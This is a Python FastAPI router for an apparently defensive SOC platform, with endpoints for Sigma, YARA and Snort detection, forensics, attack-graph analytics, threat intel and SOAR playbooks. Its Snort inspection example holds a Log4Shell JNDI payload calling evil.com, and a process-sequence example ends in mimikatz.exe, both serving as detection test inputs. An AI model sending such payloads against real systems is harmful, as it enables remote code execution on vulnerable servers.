"""Advanced Cybersecurity SOC Operations API Controller.

Exposes endpoints for:
- Sigma Detection Rule Engine & Evaluation
- Markov Chain Command Sequence Anomaly Scoring
- Bayesian Belief Network Risk Inference
- Holt-Winters Time-Series Forecaster
- Attack Graph Analytics (Dijkstra Shortest Path, Centrality, Blast Radius)
- Enterprise SOAR Playbook Execution
- Host Forensics (MFT Timestomping, Linux Artifact Triage)
"""

from typing import Any, Dict, List, Optional
from fastapi import APIRouter, Depends, HTTPException, Query, status
from pydantic import BaseModel, Field
from sqlalchemy.orm import Session

from ...core.database import get_db
from ..deps import current_user
from ...models.domain import User
from ...engines.sigma_compiler import sigma_engine
from ...ml.markov_detector import markov_detector
from ...ml.bayesian_risk import bayesian_engine, EvidenceObservation, EvidenceType
from ...ml.timeseries_forecaster import timeseries_forecaster
from ...graph.graph_algorithms import attack_graph_analytics
from ...graph.knowledge_graph import knowledge_graph
from ...services.soar_playbooks import soar_engine
from ...services.forensic_analyzer import forensic_analyzer
from ...engines.yara_engine import yara_scanner
from ...engines.snort_engine import snort_ids
from ...intelligence.massive_ioc_catalog import threat_catalog, IoCType
from ...parsers.pcap_dpi_parser import dpi_analyzer
from ...services.compliance_engine import compliance_engine
from ...intelligence.mitre_matrix import mitre_kb, MitreTactic
from ...engines.multi_signal_correlation import correlation_service
from ...services.enterprise_reporting import report_engine
from ...ml.ueba_engine import ueba_engine
from ...engines.itdr_engine import itdr_engine
from ...services.vulnerability_engine import vulnerability_engine, AttackVector, AttackComplexity, PrivilegesRequired, UserInteraction, Scope, CIAImpact
from ...services.threat_hunting import hunting_repository, HuntQueryLanguage
from ...services.adversary_emulation import adversary_emulator
from ...services.local_soc_assistant import LocalSOCAssistantEngine
from ...services.telemetry_generator import TelemetryGenerator

local_assistant = LocalSOCAssistantEngine()
telemetry_gen = TelemetryGenerator()

router = APIRouter(prefix="/advanced", tags=["Advanced SOC Engines"])


# ----------------------------------------------------------------------
# Request / Response Schemas
# ----------------------------------------------------------------------
class SigmaEvaluateRequest(BaseModel):
    event_data: Dict[str, Any]


class MarkovScoreRequest(BaseModel):
    process_sequence: List[str] = Field(..., json_schema_extra={"example": ["explorer.exe", "powershell.exe", "whoami.exe", "mimikatz.exe"]})


class BayesianEvidenceInput(BaseModel):
    evidence_type: str
    observed: bool = True
    confidence: float = 1.0
    details: Dict[str, Any] = Field(default_factory=dict)


class BayesianInferRequest(BaseModel):
    prior_probability: Optional[float] = 0.05
    evidences: List[BayesianEvidenceInput]


class TimeSeriesForecastRequest(BaseModel):
    series: List[float] = Field(..., min_length=5)
    season_length: Optional[int] = 24


class AttackPathRequest(BaseModel):
    source_node: str = Field(..., json_schema_extra={"example": "host:workstation-01"})
    target_node: str = Field(..., json_schema_extra={"example": "host:dc-01"})


class BlastRadiusRequest(BaseModel):
    seed_nodes: List[str] = Field(..., json_schema_extra={"example": ["host:workstation-01"]})
    max_hops: Optional[int] = 3


class SOARExecuteRequest(BaseModel):
    playbook_id: str = Field(..., json_schema_extra={"example": "PB-RANSOMWARE-01"})
    incident_id: str = Field(..., json_schema_extra={"example": "INC-2026-0042"})
    target_entity: str = Field(..., json_schema_extra={"example": "host:fin-srv-04"})
    dry_run: bool = True



class MFTTimestompRequest(BaseModel):
    artifacts: List[Dict[str, Any]]


class LinuxTriageRequest(BaseModel):
    bash_history: List[str] = Field(default_factory=list)
    cron_entries: List[str] = Field(default_factory=list)
    systemd_services: List[Dict[str, str]] = Field(default_factory=list)


# ----------------------------------------------------------------------
# 1. Sigma Detection Engine Endpoints
# ----------------------------------------------------------------------
@router.get("/sigma/rules")
def list_sigma_rules(current_user: User = Depends(current_user)):
    """Lists all compiled Sigma detection rules currently active in the engine."""
    return [
        {
            "id": r.metadata.id,
            "title": r.metadata.title,
            "description": r.metadata.description,
            "level": r.metadata.level,
            "mitre_attack": r.metadata.mitre_attack,
            "mitre_tactics": r.metadata.mitre_tactics,
            "logsource": r.metadata.logsource,
            "selections_count": len(r.selections),
        }
        for r in sigma_engine.rules
    ]


@router.post("/sigma/evaluate")
def evaluate_sigma_event(
    req: SigmaEvaluateRequest,
    current_user: User = Depends(current_user),
):
    """Evaluates a single telemetry event dictionary against all loaded Sigma rules."""
    matches = sigma_engine.evaluate_event(req.event_data)
    return {
        "event": req.event_data,
        "matched_rules_count": len(matches),
        "matches": matches,
    }


# ----------------------------------------------------------------------
# 2. Markov Chain Anomaly Detector Endpoints
# ----------------------------------------------------------------------
@router.post("/markov/score")
def score_markov_sequence(
    req: MarkovScoreRequest,
    current_user: User = Depends(current_user),
):
    """Computes transition log-likelihood, perplexity, and anomaly score for an execution chain."""
    return markov_detector.score_sequence(req.process_sequence)


# ----------------------------------------------------------------------
# 3. Bayesian Belief Network Risk Endpoints
# ----------------------------------------------------------------------
@router.post("/bayesian/infer")
def infer_bayesian_risk(
    req: BayesianInferRequest,
    current_user: User = Depends(current_user),
):
    """Calculates posterior compromise probability from multi-source SOC evidence observations."""
    obs_list = []
    for ev in req.evidences:
        try:
            ev_type = EvidenceType(ev.evidence_type.lower())
            obs_list.append(
                EvidenceObservation(
                    evidence_type=ev_type,
                    observed=ev.observed,
                    confidence=ev.confidence,
                    details=ev.details,
                )
            )
        except ValueError:
            pass

    return bayesian_engine.infer_compromise_probability(
        observations=obs_list,
        custom_prior=req.prior_probability,
    )


# ----------------------------------------------------------------------
# 4. Time-Series Forecaster Endpoints
# ----------------------------------------------------------------------
@router.post("/timeseries/forecast")
def forecast_timeseries(
    req: TimeSeriesForecastRequest,
    current_user: User = Depends(current_user),
):
    """Detects volumetric anomalies and trend deviations in telemetry series using Holt-Winters."""
    forecaster = timeseries_forecaster
    if req.season_length and req.season_length != forecaster.season_length:
        from ...ml.timeseries_forecaster import HoltWintersForecaster
        forecaster = HoltWintersForecaster(season_length=req.season_length)

    return forecaster.fit_and_detect(req.series)


# ----------------------------------------------------------------------
# 5. Attack Graph Analytics Endpoints
# ----------------------------------------------------------------------
@router.post("/graph/attack-path")
def compute_attack_path(
    req: AttackPathRequest,
    db: Session = Depends(get_db),
    current_user: User = Depends(current_user),
):
    """Calculates the lowest-resistance lateral movement attack path between two entities."""
    full_graph = knowledge_graph.build_graph(db)
    result = attack_graph_analytics.find_shortest_attack_path(
        nodes=full_graph["nodes"],
        edges=full_graph["edges"],
        start_node_id=req.source_node,
        target_node_id=req.target_node,
    )
    return result


@router.post("/graph/blast-radius")
def compute_incident_blast_radius(
    req: BlastRadiusRequest,
    db: Session = Depends(get_db),
    current_user: User = Depends(current_user),
):
    """Calculates propagation boundary and exposed assets surrounding compromised seeds."""
    full_graph = knowledge_graph.build_graph(db)
    return attack_graph_analytics.compute_blast_radius(
        nodes=full_graph["nodes"],
        edges=full_graph["edges"],
        compromised_seeds=req.seed_nodes,
        max_hops=req.max_hops or 3,
    )


@router.get("/graph/centrality")
def compute_graph_centrality(
    db: Session = Depends(get_db),
    current_user: User = Depends(current_user),
):
    """Calculates PageRank and Betweenness Centrality across the entire knowledge graph."""
    full_graph = knowledge_graph.build_graph(db)
    pagerank = attack_graph_analytics.calculate_pagerank(full_graph["nodes"], full_graph["edges"])
    betweenness = attack_graph_analytics.calculate_betweenness_centrality(full_graph["nodes"], full_graph["edges"])
    return {
        "pagerank_top_assets": pagerank,
        "betweenness_chokepoints": betweenness,
    }


# ----------------------------------------------------------------------
# 6. SOAR Playbooks Endpoints
# ----------------------------------------------------------------------
@router.get("/soar/playbooks")
def list_soar_playbooks(current_user: User = Depends(current_user)):
    """Lists all automated and dual-custody containment playbooks."""
    return soar_engine.list_playbooks()


@router.post("/soar/execute")
def execute_soar_playbook(
    req: SOARExecuteRequest,
    current_user: User = Depends(current_user),
):
    """Executes or dry-runs a multi-phase SOAR playbook."""
    try:
        return soar_engine.execute_playbook(
            playbook_id=req.playbook_id,
            incident_id=req.incident_id,
            target_entity=req.target_entity,
            analyst_user=current_user.username,
            dry_run=req.dry_run,
        )
    except ValueError as e:
        raise HTTPException(status_code=status.HTTP_400_BAD_REQUEST, detail=str(e))


# ----------------------------------------------------------------------
# 7. Host Forensic Analyzers Endpoints
# ----------------------------------------------------------------------
@router.post("/forensics/mft-timestomp")
def triage_mft_timestomp(
    req: MFTTimestompRequest,
    current_user: User = Depends(current_user),
):
    """Detects timestomping anti-forensics in NTFS MFT timestamps."""
    findings = forensic_analyzer.detect_mft_timestomping(req.artifacts)
    return {
        "analyzed_count": len(req.artifacts),
        "timestomped_count": sum(1 for f in findings if f["is_timestomped"]),
        "findings": findings,
    }


@router.post("/forensics/linux-triage")
def triage_linux_persistence(
    req: LinuxTriageRequest,
    current_user: User = Depends(current_user),
):
    """Analyzes Linux bash history, cron jobs, and systemd units for persistence & reverse shells."""
    return forensic_analyzer.analyze_linux_persistence_artifacts(
        bash_history_lines=req.bash_history,
        cron_entries=req.cron_entries,
        systemd_services=req.systemd_services,
    )


# ----------------------------------------------------------------------
# 8. YARA Binary Scanner Endpoints
# ----------------------------------------------------------------------
class YaraScanRequest(BaseModel):
    payload: str = Field(..., json_schema_extra={"example": "LockBit 3.0 the world's fastest ransomware"})


@router.get("/yara/rules")
def list_yara_rules(current_user: User = Depends(current_user)):
    """Lists all compiled YARA malware detection rules."""
    return [
        {
            "name": r.meta.name,
            "category": r.meta.category,
            "malware_family": r.meta.malware_family,
            "severity": r.meta.severity,
            "threat_actor": r.meta.threat_actor,
            "mitre_attack": r.meta.mitre_attack,
            "description": r.meta.description,
            "strings_count": len(r.strings),
        }
        for r in yara_scanner.rules
    ]


@router.post("/yara/scan")
def scan_payload_yara(
    req: YaraScanRequest,
    current_user: User = Depends(current_user),
):
    """Scans payload text or decoded hex against compiled YARA malware rules."""
    matches = yara_scanner.scan_payload(req.payload)
    return {
        "matched_rules_count": len(matches),
        "matches": matches,
    }


# ----------------------------------------------------------------------
# 9. Snort / Suricata IDS Inspection Endpoints
# ----------------------------------------------------------------------
class SnortInspectRequest(BaseModel):
    src_ip: str = "10.0.0.5"
    src_port: int = 54321
    dst_ip: str = "192.168.1.100"
    dst_port: int = 8080
    protocol: str = "TCP"
    payload: str = Field(..., json_schema_extra={"example": "GET /test?q=${jndi:ldap://evil.com/a} HTTP/1.1"})


@router.get("/snort/rules")
def list_snort_rules(current_user: User = Depends(current_user)):
    """Lists all loaded Snort/Suricata IDS signatures."""
    return [
        {
            "sid": r.sid,
            "rev": r.rev,
            "action": r.action,
            "msg": r.msg,
            "severity": r.severity,
            "classtype": r.classtype,
            "mitre_attack": r.mitre_attack,
            "cve": r.cve,
            "protocol": r.protocol,
        }
        for r in snort_ids.rules
    ]


@router.post("/snort/inspect")
def inspect_snort_flow(
    req: SnortInspectRequest,
    current_user: User = Depends(current_user),
):
    """Evaluates packet payload against compiled Snort/Suricata signatures."""
    alerts = snort_ids.inspect_flow(
        src_ip=req.src_ip,
        src_port=req.src_port,
        dst_ip=req.dst_ip,
        dst_port=req.dst_port,
        proto=req.protocol,
        payload=req.payload,
    )
    return {
        "alerts_count": len(alerts),
        "alerts": alerts,
    }


# ----------------------------------------------------------------------
# 10. Threat Intelligence Repository Endpoints
# ----------------------------------------------------------------------
class ThreatLookupRequest(BaseModel):
    indicator: str = Field(..., json_schema_extra={"example": "185.220.101.5"})
    indicator_type: Optional[str] = None  # ipv4, domain, sha256, md5


@router.post("/threat-intel/lookup")
def lookup_threat_intel(
    req: ThreatLookupRequest,
    current_user: User = Depends(current_user),
):
    """Performs instant offline Threat Intelligence matching across IPs, domains, and hashes."""
    ind = req.indicator.strip()
    match = threat_catalog.lookup_ip(ind) or threat_catalog.lookup_domain(ind) or threat_catalog.lookup_hash(ind)
    if not match:
        return {"found": False, "indicator": ind, "details": None}

    return {
        "found": True,
        "indicator": ind,
        "details": match.__dict__,
    }


@router.get("/threat-intel/search")
def search_threat_intel(
    q: str = Query(..., min_length=2),
    limit: int = Query(25, ge=1, le=100),
    current_user: User = Depends(current_user),
):
    """Searches offline threat intelligence catalog by actor, malware family, or keyword."""
    results = threat_catalog.search_all(q, limit=limit)
    return {
        "query": q,
        "count": len(results),
        "results": [r.__dict__ for r in results],
    }


# ----------------------------------------------------------------------
# 11. Deep Packet Inspection (DPI) Dissector Endpoints
# ----------------------------------------------------------------------
class DPIDissectRequest(BaseModel):
    packet_hex: Optional[str] = None
    dns_query_text: Optional[str] = None


@router.post("/dpi/dissect")
def dissect_packet_telemetry(
    req: DPIDissectRequest,
    current_user: User = Depends(current_user),
):
    """Performs protocol dissection, entropy calculation, and TLS/DNS anomaly detection."""
    if req.dns_query_text:
        entropy = dpi_analyzer.calculate_shannon_entropy(req.dns_query_text)
        is_tunneling = entropy > 3.8 and len(req.dns_query_text) > 35
        return {
            "query": req.dns_query_text,
            "shannon_entropy": round(entropy, 3),
            "length": len(req.dns_query_text),
            "is_dns_tunneling_suspect": is_tunneling,
            "risk_assessment": "CRITICAL_EXFILTRATION" if is_tunneling else "NORMAL_DNS_RESOLUTION",
        }

    if req.packet_hex:
        try:
            raw_bytes = bytes.fromhex(req.packet_hex.replace(" ", "").replace(":", ""))
            meta = dpi_analyzer.dissect_raw_packet(raw_bytes)
            if not meta:
                raise HTTPException(status_code=400, detail="Unable to dissect packet structure")
            return meta.__dict__
        except Exception as e:
            raise HTTPException(status_code=400, detail=f"Invalid packet hex: {str(e)}")

    raise HTTPException(status_code=400, detail="Provide either packet_hex or dns_query_text")


# ----------------------------------------------------------------------
# 12. Regulatory & Compliance Framework Audit Endpoints
# ----------------------------------------------------------------------
@router.get("/compliance/audit")
def audit_compliance_posture(current_user: User = Depends(current_user)):
    """Calculates continuous compliance posture scores across NIST CSF, ISO 27001, PCI-DSS, HIPAA, and SOC 2."""
    return compliance_engine.evaluate_posture({})


# ----------------------------------------------------------------------
# 13. MITRE ATT&CK Matrix & Navigator Endpoints
# ----------------------------------------------------------------------
class MitreNavigatorRequest(BaseModel):
    detected_techniques: List[str] = Field(default_factory=list, json_schema_extra={"example": ["T1059.001", "T1003.001", "T1486"]})


@router.get("/mitre/techniques")
def list_mitre_techniques(
    tactic: Optional[str] = None,
    current_user: User = Depends(current_user),
):
    """Lists enterprise MITRE ATT&CK techniques filtered optionally by tactic."""
    if tactic:
        try:
            tac_enum = MitreTactic[tactic.upper()]
            return [t.__dict__ for t in mitre_kb.get_techniques_by_tactic(tac_enum)]
        except KeyError:
            pass
    return [t.__dict__ for t in mitre_kb.techniques.values()]


@router.post("/mitre/navigator-layer")
def generate_mitre_navigator_layer(
    req: MitreNavigatorRequest,
    current_user: User = Depends(current_user),
):
    """Generates visual ATT&CK Navigator matrix JSON with heatmap scoring."""
    return mitre_kb.generate_navigator_matrix(req.detected_techniques)


@router.get("/mitre/search")
def search_mitre_catalog(
    q: str = Query(..., min_length=2),
    current_user: User = Depends(current_user),
):
    """Searches MITRE ATT&CK techniques by keyword, ID, or description."""
    results = mitre_kb.search_techniques(q)
    return {
        "query": q,
        "count": len(results),
        "results": [r.__dict__ for r in results],
    }


# ----------------------------------------------------------------------
# 14. Multi-Signal Event Correlation Endpoints
# ----------------------------------------------------------------------
class CorrelationStreamRequest(BaseModel):
    events: List[Dict[str, Any]] = Field(..., min_length=2)


@router.post("/correlation/correlate")
def correlate_event_stream_api(
    req: CorrelationStreamRequest,
    current_user: User = Depends(current_user),
):
    """Correlates a stream of heterogeneous events into multi-phase attack scenario candidates."""
    candidates = correlation_service.correlate_event_stream(req.events)
    return {
        "input_events_count": len(req.events),
        "candidates_count": len(candidates),
        "candidates": [c.__dict__ for c in candidates],
    }


# ----------------------------------------------------------------------
# 15. Enterprise Report Generator Endpoints
# ----------------------------------------------------------------------
class IncidentDossierRequest(BaseModel):
    incident_data: Dict[str, Any] = Field(..., json_schema_extra={"example": {"id": "INC-2026-0042", "title": "Ransomware Outbreak", "severity": "CRITICAL", "risk_score": 95.0}})


class ExecutiveSummaryRequest(BaseModel):
    soc_stats: Dict[str, Any] = Field(default_factory=dict)


@router.post("/reports/incident-dossier")
def generate_incident_dossier_report(
    req: IncidentDossierRequest,
    current_user: User = Depends(current_user),
):
    """Generates complete forensic incident dossier with Markdown and self-contained HTML."""
    report = report_engine.generate_incident_dossier(
        incident_data=req.incident_data,
        author_analyst=current_user.username,
    )
    return report.__dict__


@router.post("/reports/executive-summary")
def generate_executive_summary_report(
    req: ExecutiveSummaryRequest,
    current_user: User = Depends(current_user),
):
    """Generates executive CISO operational briefing report."""
    report = report_engine.generate_executive_summary(
        soc_stats=req.soc_stats,
        author_analyst=current_user.username,
    )
    return report.__dict__


# ----------------------------------------------------------------------
# 16. User & Entity Behavior Analytics (UEBA) Endpoints
# ----------------------------------------------------------------------
class UEBAAnalyzeRequest(BaseModel):
    username: str = Field(..., json_schema_extra={"example": "bob_finance"})
    login_hour: int = Field(..., ge=0, le=23, json_schema_extra={"example": 3})
    accessed_host: str = Field(..., json_schema_extra={"example": "dc-01"})
    bytes_transferred: float = Field(default=1024.0, json_schema_extra={"example": 150000000.0})
    failed_login_count: int = Field(default=0, json_schema_extra={"example": 5})
    session_events_count: int = Field(default=20)
    is_weekend: bool = Field(default=False)


@router.post("/ueba/analyze")
def analyze_ueba_session(
    req: UEBAAnalyzeRequest,
    current_user: User = Depends(current_user),
):
    """Evaluates user session telemetry against statistical departmental baselines."""
    findings = ueba_engine.analyze_user_activity_session(
        username=req.username,
        login_hour=req.login_hour,
        accessed_host=req.accessed_host,
        bytes_transferred=req.bytes_transferred,
        failed_login_count=req.failed_login_count,
        session_events_count=req.session_events_count,
        is_weekend=req.is_weekend,
    )
    return {
        "username": req.username,
        "is_anomalous": len(findings) > 0,
        "anomaly_count": len(findings),
        "max_risk_score": max([f.risk_score for f in findings], default=0.0),
        "findings": [f.__dict__ for f in findings],
    }


# ----------------------------------------------------------------------
# 17. Identity Threat Detection & Response (ITDR) Endpoints
# ----------------------------------------------------------------------
class ITDRKerberosRequest(BaseModel):
    event_id: str = Field(..., json_schema_extra={"example": "4769"})
    service_name: str = Field(..., json_schema_extra={"example": "MSSQLSvc/db01.corp.local"})
    ticket_encryption_type: str = Field(..., json_schema_extra={"example": "0x17"})
    client_address: str = Field(default="10.0.0.50")
    target_username: str = Field(default="svc_sql")


class ITDRDCSyncRequest(BaseModel):
    access_mask: str = Field(default="0x100")
    caller_username: str = Field(default="compromised_admin")
    caller_ip: str = Field(default="192.168.1.55")
    is_domain_controller: bool = Field(default=False)
    requested_guid: Optional[str] = None


@router.post("/itdr/kerberos")
def inspect_kerberos_itdr(
    req: ITDRKerberosRequest,
    current_user: User = Depends(current_user),
):
    """Analyzes Kerberos ticket requests for Kerberoasting and AS-REP Roasting."""
    finding = itdr_engine.inspect_kerberos_event(
        event_id=req.event_id,
        service_name=req.service_name,
        ticket_encryption_type=req.ticket_encryption_type,
        client_address=req.client_address,
        target_username=req.target_username,
    )
    return {"is_threat": finding is not None, "finding": finding.__dict__ if finding else None}


@router.post("/itdr/dcsync")
def inspect_dcsync_itdr(
    req: ITDRDCSyncRequest,
    current_user: User = Depends(current_user),
):
    """Detects unauthorized Active Directory domain replication (DCSync) via DRSUAPI."""
    finding = itdr_engine.detect_dcsync_attack(
        access_mask=req.access_mask,
        caller_username=req.caller_username,
        caller_ip=req.caller_ip,
        is_domain_controller=req.is_domain_controller,
        requested_guid=req.requested_guid,
    )
    return {"is_threat": finding is not None, "finding": finding.__dict__ if finding else None}


# ----------------------------------------------------------------------
# 18. Vulnerability Management & CVSS Calculator Endpoints
# ----------------------------------------------------------------------
class CVSSCalculateRequest(BaseModel):
    attack_vector: str = "N"
    attack_complexity: str = "L"
    privileges_required: str = "N"
    user_interaction: str = "N"
    scope: str = "U"
    confidentiality: str = "H"
    integrity: str = "H"
    availability: str = "H"


class AssetExposureRequest(BaseModel):
    asset_criticality: float = Field(default=1.0, ge=0.0, le=1.0)
    cve_ids: List[str] = Field(default_factory=list, json_schema_extra={"example": ["CVE-2021-44228", "CVE-2017-0144"]})
    is_internet_exposed: bool = True


@router.post("/vulnerability/cvss")
def calculate_cvss_score(
    req: CVSSCalculateRequest,
    current_user: User = Depends(current_user),
):
    """Calculates official CVSS v3.1 base score, subscores, and vector string."""
    score = vulnerability_engine.calculate_cvss_v31(
        av=AttackVector(req.attack_vector),
        ac=AttackComplexity(req.attack_complexity),
        pr=PrivilegesRequired(req.privileges_required),
        ui=UserInteraction(req.user_interaction),
        s=Scope(req.scope),
        c=CIAImpact(req.confidentiality),
        i=CIAImpact(req.integrity),
        a=CIAImpact(req.availability),
    )
    return score.__dict__


@router.post("/vulnerability/asset-exposure")
def calculate_asset_exposure(
    req: AssetExposureRequest,
    current_user: User = Depends(current_user),
):
    """Calculates consolidated asset risk weighted by asset criticality and CVE exploitability."""
    return vulnerability_engine.calculate_asset_exposure_risk(
        asset_criticality=req.asset_criticality,
        cve_ids=req.cve_ids,
        is_internet_exposed=req.is_internet_exposed,
    )


# ----------------------------------------------------------------------
# 19. Threat Hunting Playbooks Endpoints
# ----------------------------------------------------------------------
@router.get("/hunting/packages")
def list_threat_hunt_packages(current_user: User = Depends(current_user)):
    """Lists all proactive threat hunting packages and target techniques."""
    return hunting_repository.list_hunt_packages()


@router.get("/hunting/query/{hunt_id}")
def get_translated_hunt_query(
    hunt_id: str,
    language: str = Query("SPLUNK_SPL", description="SIGMA, SPLUNK_SPL, ELASTIC_EQL, KUSTO_KQL"),
    current_user: User = Depends(current_user),
):
    """Retrieves translated query for a threat hunting package in specified SIEM dialect."""
    try:
        lang_enum = HuntQueryLanguage[language.upper()]
        query = hunting_repository.get_query(hunt_id, lang_enum)
        if not query:
            raise HTTPException(status_code=404, detail="Query translation not found")
        return {"hunt_id": hunt_id, "language": language.upper(), "query": query}
    except KeyError:
        raise HTTPException(status_code=400, detail=f"Unsupported query language '{language}'")


# ----------------------------------------------------------------------
# 20. Adversary Emulation Framework Endpoints
# ----------------------------------------------------------------------
@router.post("/emulation/run")
def run_adversary_emulations(current_user: User = Depends(current_user)):
    """Executes safe Atomic Red Team test simulations against loaded SentinelAI detection engines."""
    return adversary_emulator.run_all_emulations()


# ----------------------------------------------------------------------
# 21. Local SOC Assistant Endpoints (Offline AI Intelligence)
# ----------------------------------------------------------------------
class AssistantChatRequest(BaseModel):
    query: str = Field(..., json_schema_extra={"example": "Summarize incident INC-2026-001 and explain risk factors"})


@router.post("/assistant/query")
def query_local_assistant(
    req: AssistantChatRequest,
    current_user: User = Depends(current_user),
):
    """Processes natural language SOC queries using deterministic local intelligence and rule engines."""
    resp = local_assistant.generate_response(req.query)
    return {
        "query": resp.query,
        "intent": resp.intent,
        "confidence": resp.confidence,
        "headline": resp.headline,
        "markdown_content": resp.markdown_content,
        "structured_data": resp.structured_data,
        "suggested_actions": resp.suggested_actions,
        "mitre_references": resp.mitre_references,
        "timestamp": resp.timestamp,
    }


# ----------------------------------------------------------------------
# 22. Multi-Source Synthetic Telemetry Generator Endpoints
# ----------------------------------------------------------------------
class TelemetryGenerateRequest(BaseModel):
    count: Optional[int] = Field(50, ge=1, le=500)
    include_attacks: Optional[bool] = True


@router.post("/telemetry/generate")
def generate_synthetic_telemetry(
    req: TelemetryGenerateRequest,
    current_user: User = Depends(current_user),
):
    """Generates enterprise multi-source security events (Sysmon, Windows EVTX, Zeek, Suricata)."""
    events = telemetry_gen.generate_telemetry_batch(
        count=req.count or 50,
        include_attacks=req.include_attacks if req.include_attacks is not None else True
    )
    return {
        "total_generated": len(events),
        "events": events,
        "source_breakdown": {
            "sysmon": sum(1 for e in events if e.get("source_type") == "SYSMON_EVTX"),
            "windows_security": sum(1 for e in events if e.get("source_type") == "WINDOWS_SECURITY_EVTX"),
            "zeek_dns": sum(1 for e in events if e.get("source_type") == "ZEEK_DNS"),
            "suricata_eve": sum(1 for e in events if e.get("source_type") == "SURICATA_EVE_JSON"),
        }
    }
